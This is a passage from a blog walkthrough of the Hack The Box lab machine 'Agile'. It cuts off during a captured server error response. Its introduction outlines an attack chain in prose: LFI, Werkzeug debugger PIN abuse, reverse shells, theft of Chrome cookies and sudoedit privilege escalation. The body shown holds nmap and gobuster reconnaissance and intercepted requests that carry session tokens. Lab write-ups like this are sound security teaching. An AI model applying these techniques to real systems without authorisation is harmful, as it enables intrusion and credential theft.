<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Agile HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Agile HTB Walkthrough"><meta property="og:description" content="Introduction After basic enumeration, we use LFI to read a Python Flask app. We exploit the Werkzeug remote debugger by reading system information from the file system used to derive a PIN granting console access. After executing arbitrary Python code in the browser REPL to get a reverse shell, we connect to a database with credentials from a connection string found earlier, which reveals user credentials granting us SSH access."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-08-06-agile-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-06T00:00:00+10:00"><meta property="article:modified_time" content="2023-08-06T17:33:14+10:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Agile HTB Walkthrough"><meta name=twitter:description content="Introduction After basic enumeration, we use LFI to read a Python Flask app. We exploit the Werkzeug remote debugger by reading system information from the file system used to derive a PIN granting console access. After executing arbitrary Python code in the browser REPL to get a reverse shell, we connect to a database with credentials from a connection string found earlier, which reveals user credentials granting us SSH access."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-08-06-agile-htb/><link rel=prev href=https://emdwyer.github.io/2023-06-03-bagel-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Agile HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-08-06-agile-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, werkzeug, sudoedit, chrome, CVE-2023-22809","wordcount":10180,"url":"https:\/\/emdwyer.github.io\/2023-08-06-agile-htb\/","datePublished":"2023-08-06T00:00:00+10:00","dateModified":"2023-08-06T17:33:14+10:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Agile HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-08-06>2023-08-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;10180 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;48 minutes&nbsp;<span id=/2023-08-06-agile-htb/ class=leancloud_visitors data-flag-title="Agile HTB Walkthrough">
<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./agile.png data-srcset="./agile.png, ./agile.png 1.5x, ./agile.png 2x" data-sizes=auto alt=./agile.png title=Agile></p><h2 id=introduction>Introduction</h2><p>After basic enumeration, we use LFI to read a Python Flask app. We exploit the Werkzeug remote debugger by reading system information from the file system used to derive a PIN granting console access. After executing arbitrary Python code in the browser REPL to get a reverse shell, we connect to a database with credentials from a connection string found earlier, which reveals user credentials granting us SSH access. Next, we find a test suite that connects to headless Chrome using the Selenium web driver to run tests requiring authentication against a test instance of our vault app. We learn how to connect to the Chrome remote debugger and dump cookies. With access to the vault from a stolen cookie, we find a set of credentials that grants us SSH access to another user. Finally, we exploit <code>sudoedit</code>, allowing us to edit arbitrary files &ndash; we add another python reverse shell to a known cron job running as root, which grants us the root flag.</p><h2 id=enumeration>Enumeration</h2><p>Let&rsquo;s run a basic nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.203
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-03-19 15:59 AEDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.203
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.024s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> f4bcee21d71f1aa26572212d5ba6f700 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 65c1480d88cbb975a02ca5e6377e5106 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://superpass.htb
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.54 seconds
</span></span></code></pre></td></tr></table></div></div><p>We add <code>10.10.11.203 superpass.htb</code> to /etc/hosts.. Navigating to the running web server, we get a landing page:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-02-48-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-02-48-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-02-48-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-02-48-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-02-48-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-02-48-image.png width=1601 height=1278></p><p>Clicking the Get Started call-to-action or Login in the nav bar takes us to this login screen. Note the Get Started action includes query param <code>next=%2Fvault</code> (not really useful later on, but I noted it here while in the moment!):</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-04-44-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-04-44-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-04-44-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-04-44-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-04-44-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-04-44-image.png width=1611 height=534></p><p>Running a gobuster scan in the background, we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> dir -w /usr/share/wordlists/dirb/common.txt -u http://superpass.htb
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://superpass.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/03/19 16:03:32 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/download             <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 249<span class=o>]</span> <span class=o>[</span>--&gt; /account/login?next<span class=o>=</span>%2Fdownload<span class=o>]</span>
</span></span><span class=line><span class=cl>/static               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://superpass.htb/static/<span class=o>]</span>   
</span></span><span class=line><span class=cl>/vault                <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 243<span class=o>]</span> <span class=o>[</span>--&gt; /account/login?next<span class=o>=</span>%2Fvault<span class=o>]</span>   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/03/19 16:03:44 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try the register option with some credentials <code>jsomeone</code>/ <code>foobar</code>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-09-04-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-09-04-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-09-04-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-09-04-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-09-04-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-09-04-image.png width=1602 height=546></p><p>Which gives me an exception and stack trace &ndash; unsure if this was intended, or a genuine error? (I later found out this is just a bug/problem, and not intended to be part of the process):</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-18-36-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-18-36-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-18-36-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-18-36-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-18-36-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-18-36-image.png width=1585 height=1152></p><p>A refresh shows me a vault where I can add and export passwords. So it seems I can easily register and log in:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-20-14-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-20-14-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-20-14-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-20-14-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-20-14-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-20-14-image.png width=946 height=260></p><p>When clicking <em>Add a password</em>, we see what looks like a password manager, generating a random password for us &ndash; and we can enter a site and username, before clicking save:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-16-23-30-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-16-23-30-image.png, /2023-08-06-agile-htb/assets/2023-03-19-16-23-30-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-16-23-30-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-16-23-30-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-16-23-30-image.png width=949 height=197></p><p>When saving the above, as captured by BurpSuite:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /vault/add_row HTTP/1.1
</span></span><span class=line><span class=cl>Host: superpass.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://superpass.htb/vault
</span></span><span class=line><span class=cl>HX-Request: true
</span></span><span class=line><span class=cl>HX-Current-URL: http://superpass.htb/vault
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 66
</span></span><span class=line><span class=cl>Origin: http://superpass.htb
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Cookie: session=.eJy9jk1qwzAQha8iZm2KJI9GGp-i-xLCSBrFBrcJlrMKuXsFvUNXj8f74XvBte3SV-2wfL3AnEPgW3uXm8IEn7tKV7Pfb2b7MefdSCkjNOe6dfMYnQ-4vKd_3l2mAX1oX2E5j6cOt1VYALlmx61pTjXGhOixVVtKSLFIFSGpDWeRHIkyBs3sQmCLwjIHKoTNBk7quQkl710pXplnDhibsiWuQVJUJ9Qo0eyrJLE4TmIKlmMZ-Ndn1-OPxjt4_wIcJ2t7.ZBaZAA.8XRrRgigTWhr28G4u9SW_oL8u4A; remember_token=21|375c7a4d26553e4e568b19ac19f945febe04f81248efe05bbcc6c522853c580393454491f9638fd8999ce58ac91e2919d49448ed7b9e3db167a61c9934a433ae
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>url=www.google.com&amp;username=jsomeone&amp;password=4c93f8a00620782c329f
</span></span></code></pre></td></tr></table></div></div><p>We can also export our vault, as CSV, which is a <code>GET /vault/export</code> request, and following the 302 redirect in BurpSuite we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /download?fn=jsomeone_export_bea9db78a7.csv HTTP/1.1
</span></span><span class=line><span class=cl>Host: superpass.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Cookie: session=.eJy9jk1qwzAQha8iZm2KJI9GGp-i-xLCSBrFBrcJlrMKuXsFvUNXj8f74XvBte3SV-2wfL3AnEPgW3uXm8IEn7tKV7Pfb2b7MefdSCkjNOe6dfMYnQ-4vKd_3l2mAX1oX2E5j6cOt1VYALlmx61pTjXGhOixVVtKSLFIFSGpDWeRHIkyBs3sQmCLwjIHKoTNBk7quQkl710pXplnDhibsiWuQVJUJ9Qo0eyrJLE4TmIKlmMZ-Ndn1-OPxjt4_wIcJ2t7.ZBaZAA.8XRrRgigTWhr28G4u9SW_oL8u4A; remember_token=21|375c7a4d26553e4e568b19ac19f945febe04f81248efe05bbcc6c522853c580393454491f9638fd8999ce58ac91e2919d49448ed7b9e3db167a61c9934a433ae
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Referer: http://superpass.htb/vault/export
</span></span></code></pre></td></tr></table></div></div><p>If we change the CSV filename to something bogus, we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 500 INTERNAL SERVER ERROR
</span></span><span class=line><span class=cl>Server: nginx/1.18.0 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Sun, 19 Mar 2023 05:57:11 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 13639
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;!doctype html&gt;
